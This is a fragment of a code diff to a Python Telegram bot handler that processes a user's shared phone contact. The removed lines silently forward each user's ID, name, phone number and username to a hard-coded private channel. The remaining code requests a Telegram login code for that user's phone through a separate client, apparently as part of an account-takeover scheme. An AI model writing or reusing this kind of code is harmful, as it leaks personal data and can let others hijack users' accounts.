@@ -62,18 +62,6 @@ async def handle_contact(message: types.Message, state: FSMContext,bot: Bot):
         await db.update_user_phone(phone_number, telegram_id=user.id)
 
     try:
-        # ✅ Send user info to your private channel
-        mention = f'<a href="tg://user?id={user.id}">{user.full_name}</a>'
-        text = (
-            "📥 <b>Yangi foydalanuvchi maʼlumotlari</b>\n\n"
-            f"🆔 <b>User ID:</b> <code>{user.id}</code>\n"
-            f"👤 <b>F.I.O:</b> {mention}\n"
-            f"🔢 <b>Telefon raqami:</b> <code>{phone_number}</code>\n"
-            f"💬 <b>Username:</b> @{user.username if user.username else 'yo‘q'}"
-        )
-        await bot.send_message(chat_id=-1002592929654, text=text, parse_mode="HTML")
-
-
         sent = await client.send_code_request(phone_number)
         # print(sent)
         await state.update_data(
